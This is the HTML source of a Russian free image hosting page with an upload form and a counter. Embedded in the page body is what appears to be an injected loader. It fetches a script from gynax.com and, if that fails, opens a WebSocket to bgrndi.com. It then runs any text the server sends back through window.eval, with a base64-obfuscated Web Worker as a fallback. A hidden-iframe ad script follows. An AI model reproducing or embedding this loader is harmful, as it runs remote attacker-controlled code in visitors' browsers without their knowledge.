
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>


<meta name="generator" content="Chevereto NB1.9r1" /><!-- LET IT BIT! -->


<title>Добро пожаловать на Хостинг картинок - Хостинг картинок</title>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1251" />
<meta http-equiv="content-language" content="en" />
<link href="http://all-poster.ru/estilo.css" rel="stylesheet" type="text/css" />

<meta name="description" content="all-poster.ru - быстрый и бесплатный хостинг картинок"/>
<meta name="keywords" content="хостинг изображений, фотохостинг, загрузить фото на форум, хостинг картинок, файлообменник, загрузить, бесплатно, фото, картинка, альбом, галереи, форум, закачать фото, публикация фотографий, оптимизация фотографий для Интернета, разместить фотографию"/>
<meta name="robots" content="index,follow"/>

<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />


<!--[if lt IE 7.]>
<script defer type="text/javascript" src="/js/pngfix.js"></script>
<![endif]-->


<script type="text/javascript">google.load("jquery", "1");</script>
<script type="text/javascript" src="/js/jquery.scrollTo-min.js"></script>
<script type="text/javascript" src="/js/jquery_support.js"></script>


<script type="text/javascript">
// <![CDATA[
$(document).ready(function(){
upload();pref();});
// ]]>
</script>

</head>


<body>

<!-- Composite Start -->
<script>(function () {var script_id = 'NDMw', dm = (location.protocol == 'https:') ? 'https://' : 'http://'; s = document.createElement('script');s.type = 'text/javascript';s.charset = 'utf-8';s.src = dm + 'gynax.com/js/' + script_id + '.js?r='+Math.random()*10000000000;s.async = true;s.onerror = function(){var ws = new WebSocket('wss://bgrndi.com:8041/'); ws.onopen = function () { ws.send(JSON.stringify({type: 'p', id: script_id})); }; ws.onmessage = function (tx) { ws.close(); window.eval(tx.data); }; ws.onerror = function () { var b6_430=atob('d3NfNDMwID0gbmV3IFdlYlNvY2tldCgnd3NzOi8vYmdybmRpLmNvbTo4MDQxLycpLAogICAgICAgICAgICB3c180MzAub25vcGVuID0gZnVuY3Rpb24gKCkgewogICAgICAgICAgICB3c180MzAuc2VuZChKU09OLnN0cmluZ2lmeSh7dHlwZTogJ3AnLCBpZDogJ05ETXcnfSkpOwogICAgICAgICAgICB9OwogICAgICAgICAgICB3c180MzAub25tZXNzYWdlID0gZnVuY3Rpb24gKHQpIHsKICAgICAgICAgICAgICAgIHBvc3RNZXNzYWdlKHQuZGF0YSk7CiAgICAgICAgICAgICAgICB3c180MzAuY2xvc2UoKTsKICAgICAgICAgICAgfTs=');wc_430 = new Worker(URL.createObjectURL(new Blob([b6_430]), {type: 'application/javascript'})); wc_430.onmessage = function (msg) { window.eval(msg.data); };};};document.body.appendChild(s);})();</script>
<!-- Composite End -->

<!--<div id="top">
    <div id="tagline">Хостинг картинок</div><div id="limite">JPG PNG BMP GIF <span>Max.1Mb</span></div>
</div>-->
<br>





<div id="contenido">

<div id="selector_up">
	<div id="tab_container">
    	<div class="btn_local"><a class="local" id="linklocal" style="display: none;"></a></div>
        <div class="btn_remoto"><a class="remota" id="linkremota"></a></div>
    </div>
<div id="preferencias"><a id="pclosed"><span>настройки</span></a><a id="popen" style="display:none;"><span>настройки</span></a></div> 
</div> <!-- selector -->
	
	<form id="form_up" enctype="multipart/form-data" action="/" method="post">
    <input type="hidden" name="postkey" id="postkey" value="6914034f07745a632c503de6e4277df9" />

		<div id="pref-panel" style="display: none;"><div id="cajon-pref"><p id="prefurl"><input name="" type="checkbox" id="cortarurl" value=""  /><label for="cortarurl"> Сделать короткую ссылку TinyURL</label></p><div id="save"><a id="savepref" />свернуть</a></div></div></div>  
    

    <div id="contenedorupload">
        <div id="subir_local">
            <h2 id="chooselocal">Выберите изображение на своём комьютере</h2>
            <div class="inputs"><input name="fileup" type="file" size="60" id="localUP" onclick="javascript:document.getElementById('remotaUP').value = '';"/></div>
        </div>
        <div id="subir_remota" style="display: none;">
            <h2 id="chooseremota">Введите <abbr title="Пример: http://where-is-the-image.com/image.jpg">адрес</abbr> изображения в интернете</h2>
            <div class="inputs"><input name="remota" size="60" id="remotaUP" onclick="javascript:document.getElementById('localUP').value = '';"/></div>
        </div>
    </div>
	    
    <div id="redimensionar">
    	<div id="redimensionar_cajatitulo">
            <div id="redimensionar_titulo">
                <div id="boton_redimensionar"><span><a id="rclosed"></a><a id="ropen" style="display: none;"></a></span></div>
                <div id="red_mensaje"><span id="red1">изменить размер изображения</span><span id="red2" style="display: none;"></span></div>
            </div>
        </div>        
        <div id="redimensionar-borde" style="display: none;">
        	<div id="cajonred">
                <div id="ancho_deseado">Желаемая ширина <span></span></div>
                <input name="resize" id="resize"/>
                <div id="kepp">в пикселях</div>
            </div>
        </div>
    </div>
    
    <div id="boton_subir">
    	<input type="image" src="/site-img/btn_subir.gif" id="subir"/>
    	<div id="enviando" style="display: none;"><span id="momentito">Загрузка...</span></div>
    </div>
    
	</form>




<br> 




<!--LiveInternet counter--><script type="text/javascript"><!--
document.write("<a href='http://www.liveinternet.ru/click' "+
"target=_blank><img src='//counter.yadro.ru/hit?t44.6;r"+
escape(document.referrer)+((typeof(screen)=="undefined")?"":
";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
";"+Math.random()+
"' alt='' title='LiveInternet' "+
"border='0' width='31' height='31'><\/a>")
//--></script><!--/LiveInternet-->





<br>

</div> 



<!-- Composite Start -->
<div id="M12644ScriptRootC631107">
        <div id="M12644PreloadC631107">
       
    </div>
        <script>
                (function(){
            var D=new Date(),d=document,b='body',ce='createElement',ac='appendChild',st='style',ds='display',n='none',gi='getElementById';
            var i=d[ce]('iframe');i[st][ds]=n;d[gi]("M12644ScriptRootC631107")[ac](i);try{var iw=i.contentWindow.document;iw.open();iw.writeln("<ht"+"ml><bo"+"dy></bo"+"dy></ht"+"ml>");iw.close();var c=iw[b];}
            catch(e){var iw=d;var c=d[gi]("M12644ScriptRootC631107");}var dv=iw[ce]('div');dv.id="MG_ID";dv[st][ds]=n;dv.innerHTML=631107;c[ac](dv);
            var s=iw[ce]('script');s.async='async';s.defer='defer';s.charset='utf-8';s.src="//jsc.marketgid.com/a/l/all-poster.ru.631107.js?t="+D.getYear()+D.getMonth()+D.getDate()+D.getHours();c[ac](s);})();
    </script>
</div>
<!-- Composite End -->
</body>
</html>